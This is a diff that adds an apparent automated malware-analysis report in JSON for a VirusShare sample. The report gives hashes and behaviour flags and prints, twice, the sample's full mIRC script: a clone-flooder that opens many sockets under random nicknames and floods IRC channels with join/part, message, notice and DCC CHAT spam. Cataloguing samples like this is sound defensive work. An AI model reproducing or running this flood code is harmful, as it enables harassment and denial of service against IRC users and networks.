@@ -1,0 +1,81 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "chr": "May attempt to obfuscate specific str",
+            "kill": "May delete a file",
+            "register": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "on *:sockread:w3arab*:{\n  sockread %floodread\n  Stay %floodread\n}\nalias fln1ck {\n  set %fln1ck $rand(1,10)\n  if (%fln1ck = 1) { return $read xtf $+ $chr($r(65,125)) $+ $chr($r(65,125))  }\n  if (%fln1ck = 2) { return $chr($r(65,125)) $+ $read xtf $+ $chr($r(65,125))  }\n  if (%fln1ck = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $read xtf }\n  if (%fln1ck = 4) { return $r(A,Z) $+ $read xtf $+ $r(A,Z) }\n  if (%fln1ck = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }\n  if (%fln1ck = 6) { return $read xtf $+ $r(1,40) $+ $chr($r(65,125))  }\n  if (%fln1ck = 7) { return $r(a,z) $+ $read xtf $+ $r(a,z) }\n  if (%fln1ck = 8) { return $read xtf $+ $r(a,z) $+ $chr($r(65,125))  }\n  if (%fln1ck = 9) { return $read xtf $+ $r(1,10) $+ $chr($r(65,125))  }\n  if (%fln1ck = 10) { return $read xtf $+ $r(20,50) $+ $chr($r(65,125)) }\n}\nalias clonez {\n  if ($1 = con) { set %cserver $2 | /set %cport $3 | /timeropensock $+ $fln1ck $4 2 opensock }\n  if ($1 = join) { sockwrite -nt w3arab* Join $2- }\n  if ($1 = part) { sockwrite -nt w3arab* Part $2 : $+ $3- }\n  if ($1 = msg) { sockwrite -nt w3arab* privmsg $2 : $+ $3- }\n  if ($1 = notice) { sockwrite -nt w3arab* notice $2 : $+ $3- }\n  if ($1 = reg) { sockwrite -nt w3arab* Privmsg NickServ : $+ register $2- | sockwrite -nt w3arab* Privmsg NickServ : $+ identify $2- }\n  if ($1 = creg) { set %rchan # $+ $fln1ck $+ $rand(1,1000) | sockwrite -nt w3arab* Join %rchan | sockwrite -nt w3arab* Privmsg Chanserv : register %rchan $fln1ck w3arab }\n  if ($1 = jp) { sockwrite -nt w3arab* Join $2- | sockwrite -nt w3arab* part $2 : $3- | sockwrite -nt w3arab* Join $2- | sockwrite -nt w3arab* part $2 : $3- | sockwrite -nt w3arab* Join $2- | sockwrite -nt w3arab* part $2 : $3- }\n  if ($1 = jmp) { sockwrite -nt w3arab* Join $2 | sockwrite -nt w3arab* privmsg $2 : $3- | sockwrite -nt w3arab* part $2 }\n  if ($1 = flood.c) { sockwrite -nt w3arab* join $2 | sockwrite -nt w3arab* privmsg $2 : $3- | sockwrite -nt w3arab* notice $2 : $3- | sockwrite -nt w3arab* privmsg $2 : $3- }\n  if ($1 = flood.n) { sockwrite -nt w3arab* privmsg $2 : $3- | sockwrite -nt w3arab* notice $2 : $3- | sockwrite -nt w3arab* privmsg $2 : $3- }\n  if ($1 = chat.flood) { sockwrite -nt w3arab* privmsg $2 :\u0001DCC CHAT $2 1058633484 3481\u0001  }\n  if ($1 = Quit) { Sockwrite -nt w3arab* Quit : $+ $2- }\n  if ($1 = fxt) { sockwrite -nt w3arab* join $2 | sockwrite -nt w3arab* privmsg $2 : $3- | sockwrite -nt w3arab* notice $2 : $3- | sockwrite -nt w3arab* privmsg $2 : $3- | sockwrite -nt w3arab* privmsg $2 : $3-  | sockwrite -nt w3arab* Nick Guest $+ $r(1,1000) $+ $r(1,1000) | Sockwrite -nt w3arab* Quit : $+ $3- }\n  if ($1 = massquit) { SockWrite -nt w3arab* Join $2 | Sockwrite -nt w3arab* Quit : $+ $3- }\n  if ($1 = fnick { sockwrite -nt w3arab* Nick $2 $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }\n  if ($1 = random) { sockwrite -nt w3arab* Nick $read(xtf) $+ $r(1,9)  }\n  if ($1 = Die) { timeropensock* off | sockclose w3arab }\n  if ($1 = kill) { timeropensock* off | sockclose w3arab }\n  if ($1 = quit) { timeropensock* off | sockclose w3arab }\n}\nalias opensock { sockopen w3arab $+ $fln1ck %cserver %cport }\nalias xtf2 { $read(xtf) }\nalias Stay {\n  if (PING = $1) { sockwrite -nt * $1- }\n}\non *:Sockopen:w3arab*:{\n  set -u1 %user $read(xtf)\n  .sockwrite -nt $sockname USER %user %user %user : $+ %user\n  .sockwrite -nt $sockname NICK Guest $+ $r(1,9999)\n}"
+    },
+    "filename": "VirusShare_f4000813b372335276aaad4f8b765407",
+    "filesize": 3481,
+    "filetype": "data",
+    "hashes": {
+        "md5": "f4000813b372335276aaad4f8b765407",
+        "sha1": "142d4e284e8a1841e8d714b8fdda0eb0a00a09d7",
+        "sha256": "a9f3f4dd0a8454a754493f5da183cb1a34c3c8b19d5ee931172b8b8bc1465f49"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "on *:sockread:w3arab*:{",
+            "  sockread %floodread",
+            "  Stay %floodread",
+            "alias fln1ck {",
+            "  set %fln1ck $rand(1,10)",
+            "  if (%fln1ck = 1) { return $read xtf $+ $chr($r(65,125)) $+ $chr($r(65,125))  }",
+            "  if (%fln1ck = 2) { return $chr($r(65,125)) $+ $read xtf $+ $chr($r(65,125))  }",
+            "  if (%fln1ck = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $read xtf }",
+            "  if (%fln1ck = 4) { return $r(A,Z) $+ $read xtf $+ $r(A,Z) }",
+            "  if (%fln1ck = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }",
+            "  if (%fln1ck = 6) { return $read xtf $+ $r(1,40) $+ $chr($r(65,125))  }",
+            "  if (%fln1ck = 7) { return $r(a,z) $+ $read xtf $+ $r(a,z) }",
+            "  if (%fln1ck = 8) { return $read xtf $+ $r(a,z) $+ $chr($r(65,125))  }",
+            "  if (%fln1ck = 9) { return $read xtf $+ $r(1,10) $+ $chr($r(65,125))  }",
+            "  if (%fln1ck = 10) { return $read xtf $+ $r(20,50) $+ $chr($r(65,125)) }",
+            "alias clonez {",
+            "  if ($1 = con) { set %cserver $2 | /set %cport $3 | /timeropensock $+ $fln1ck $4 2 opensock }",
+            "  if ($1 = join) { sockwrite -nt w3arab* Join $2- }",
+            "  if ($1 = part) { sockwrite -nt w3arab* Part $2 : $+ $3- }",
+            "  if ($1 = msg) { sockwrite -nt w3arab* privmsg $2 : $+ $3- }",
+            "  if ($1 = notice) { sockwrite -nt w3arab* notice $2 : $+ $3- }",
+            "  if ($1 = reg) { sockwrite -nt w3arab* Privmsg NickServ : $+ register $2- | sockwrite -nt w3arab* Privmsg NickServ : $+ identify $2- }",
+            "  if ($1 = creg) { set %rchan # $+ $fln1ck $+ $rand(1,1000) | sockwrite -nt w3arab* Join %rchan | sockwrite -nt w3arab* Privmsg Chanserv : register %rchan $fln1ck w3arab }",
+            "  if ($1 = jp) { sockwrite -nt w3arab* Join $2- | sockwrite -nt w3arab* part $2 : $3- | sockwrite -nt w3arab* Join $2- | sockwrite -nt w3arab* part $2 : $3- | sockwrite -nt w3arab* Join $2- | sockwrite -nt w3arab* part $2 : $3- }",
+            "  if ($1 = jmp) { sockwrite -nt w3arab* Join $2 | sockwrite -nt w3arab* privmsg $2 : $3- | sockwrite -nt w3arab* part $2 }",
+            "  if ($1 = flood.c) { sockwrite -nt w3arab* join $2 | sockwrite -nt w3arab* privmsg $2 : $3- | sockwrite -nt w3arab* notice $2 : $3- | sockwrite -nt w3arab* privmsg $2 : $3- }",
+            "  if ($1 = flood.n) { sockwrite -nt w3arab* privmsg $2 : $3- | sockwrite -nt w3arab* notice $2 : $3- | sockwrite -nt w3arab* privmsg $2 : $3- }",
+            "  if ($1 = chat.flood) { sockwrite -nt w3arab* privmsg $2 :",
+            "DCC CHAT $2 1058633484 3481",
+            "  if ($1 = Quit) { Sockwrite -nt w3arab* Quit : $+ $2- }",
+            "  if ($1 = fxt) { sockwrite -nt w3arab* join $2 | sockwrite -nt w3arab* privmsg $2 : $3- | sockwrite -nt w3arab* notice $2 : $3- | sockwrite -nt w3arab* privmsg $2 : $3- | sockwrite -nt w3arab* privmsg $2 : $3-  | sockwrite -nt w3arab* Nick Guest $+ $r(1,1000) $+ $r(1,1000) | Sockwrite -nt w3arab* Quit : $+ $3- }",
+            "  if ($1 = massquit) { SockWrite -nt w3arab* Join $2 | Sockwrite -nt w3arab* Quit : $+ $3- }",
+            "  if ($1 = fnick { sockwrite -nt w3arab* Nick $2 $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }",
+            "  if ($1 = random) { sockwrite -nt w3arab* Nick $read(xtf) $+ $r(1,9)  }",
+            "  if ($1 = Die) { timeropensock* off | sockclose w3arab }",
+            "  if ($1 = kill) { timeropensock* off | sockclose w3arab }",
+            "  if ($1 = quit) { timeropensock* off | sockclose w3arab }",
+            "alias opensock { sockopen w3arab $+ $fln1ck %cserver %cport }",
+            "alias xtf2 { $read(xtf) }",
+            "alias Stay {",
+            "  if (PING = $1) { sockwrite -nt * $1- }",
+            "on *:Sockopen:w3arab*:{",
+            "  set -u1 %user $read(xtf)",
+            "  .sockwrite -nt $sockname USER %user %user %user : $+ %user",
+            "  .sockwrite -nt $sockname NICK Guest $+ $r(1,9999)"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.279161",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
